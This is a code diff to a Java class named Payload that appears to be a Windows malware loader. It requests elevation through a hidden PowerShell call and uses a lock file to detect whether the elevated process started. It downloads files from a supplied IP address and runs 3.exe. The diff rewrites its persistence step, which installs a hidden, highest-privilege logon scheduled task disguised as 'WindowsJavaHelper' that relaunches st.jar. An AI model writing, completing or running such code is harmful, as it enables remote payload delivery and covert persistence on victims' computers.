@@ -55,7 +55,6 @@ public class Payload {
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             File lockFile = new File(getLoaderDir(), ".lock");
 
-            // Create the file and close it immediately so the child can delete it
             lockFile.createNewFile();
 
             String psCommand = String.format(
@@ -67,16 +66,14 @@ public class Payload {
             Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
             p.waitFor();
             
-            // Give the elevated process up to 10 seconds to start up and delete the lock file
             log("Waiting for elevated process...");
             for (int i = 0; i < 100; i++) {
                 if (!lockFile.exists()) {
-                    return true; // Lock deleted = elevated process is running
+                    return true;
                 }
-                Thread.sleep(100); // Check every 100ms
+                Thread.sleep(100);
             }
             
-            // If we get here, the lock file still exists after 10 seconds (User clicked No)
             if (lockFile.exists()) lockFile.delete();
             return false;
         } catch (Exception e) {
@@ -193,7 +190,6 @@ public class Payload {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
             
-            // Delete the lock file to signal the parent process to die
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
@@ -211,7 +207,6 @@ public class Payload {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
-            // FIX: Use absolute paths to guarantee ProcessBuilder finds the EXE
             File exe3 = new File(loaderDir, "3.exe");
             log("Executing 3.exe...");
             new ProcessBuilder(exe3.getAbsolutePath(), "all")
@@ -256,43 +251,22 @@ public class Payload {
             String jarPath = getLoaderDir().getAbsolutePath() + "\\st.jar";
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javawPath = javaHome + "\\bin\\javaw.exe";
-            String xmlPath = getLoaderDir().getAbsolutePath() + "\\task.xml";
+            
+            // Build the exact command string to run
+            String trCmd = "\"" + javawPath + "\" -jar \"" + jarPath + "\" " + key + " " + ip;
 
-            String xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
-                "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
-                "  <Triggers>\n" +
-                "    <LogonTrigger>\n" +
-                "      <Enabled>true</Enabled>\n" +
-                "    </LogonTrigger>\n" +
-                "  </Triggers>\n" +
-                "  <Principals>\n" +
-                "    <Principal id=\"Author\">\n" +
-                "      <LogonType>InteractiveToken</LogonType>\n" +
-                "      <RunLevel>HighestAvailable</RunLevel>\n" + 
-                "    </Principal>\n" +
-                "  </Principals>\n" +
-                "  <Settings>\n" +
-                "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n" +
-                "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n" +
-                "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n" +
-                "    <AllowHardTerminate>true</AllowHardTerminate>\n" +
-                "    <StartWhenAvailable>true</StartWhenAvailable>\n" +
-                "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n" +
-                "    <Enabled>true</Enabled>\n" +
-                "    <Hidden>true</Hidden>\n" +
-                "  </Settings>\n" +
-                "  <Actions Context=\"Author\">\n" +
-                "    <Exec>\n" +
-                "      <Command>\"" + javawPath + "\"</Command>\n" +
-                "      <Arguments>-jar \"" + jarPath + "\" " + key + " " + ip + "</Arguments>\n" +
-                "    </Exec>\n" +
-                "  </Actions>\n" +
-                "</Task>";
-
-            Files.write(Paths.get(xmlPath), xml.getBytes("UTF-16"));
-
-            String cmd = "cmd.exe /c schtasks.exe /Create /TN \"WindowsJavaHelper\" /XML \"" + xmlPath + "\" /F";
-            Process p = Runtime.getRuntime().exec(cmd);
+            // Use ProcessBuilder to call schtasks directly without XML
+            ProcessBuilder pb = new ProcessBuilder(
+                "schtasks.exe",
+                "/Create",
+                "/TN", "WindowsJavaHelper",
+                "/TR", trCmd,
+                "/SC", "ONLOGON",
+                "/RL", "HIGHEST",
+                "/F"
+            );
+            
+            Process p = pb.start();
             
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line;
@@ -300,11 +274,15 @@ public class Payload {
             while ((line = reader.readLine()) != null) {
                 output.append(line).append("\n");
             }
+            
+            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+            while ((line = errReader.readLine()) != null) {
+                output.append("ERR: ").append(line).append("\n");
+            }
+
             p.waitFor();
             
             log("schtasks output:\n" + output.toString());
-            
-            new File(xmlPath).delete();
             log("Startup task installed successfully.");
         } catch (Exception e) {
             log("Task install failed: " + e.toString());
